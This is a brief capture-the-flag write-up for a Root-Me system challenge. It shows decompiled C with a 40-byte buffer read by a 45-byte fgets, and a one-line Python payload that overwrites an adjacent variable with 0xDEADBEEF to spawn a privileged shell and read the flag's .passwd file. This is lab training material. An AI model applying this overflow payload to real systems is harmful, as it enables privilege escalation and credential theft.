### Solved by Hayicle

First I download binary file with my scp-script
```
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```
I use IDA to analysis the code .

```c
 char buffer[40];		#overflow the buffer
 int v5 = 0x4030201;		#then we can control v5
 fgets((char *)&v4, 45, stdin);
 ....

 ....
 if ( v5 == 0xDEADBEEF )	#if we can overflow v5 become 0xdeadbeef we				   can run /bin/dash with permission of file
  {
    puts("Yeah dude ! You win !");
    system("/bin/dash");
  }
```

This is how we understand the code .Now we get the idea.
Let write python script to control this.
```python
(python -c 'print "A"*40+"\xef\xbe\xad\xde"';cat)|./ch13
```

Now we have permission to cat file .passwd!
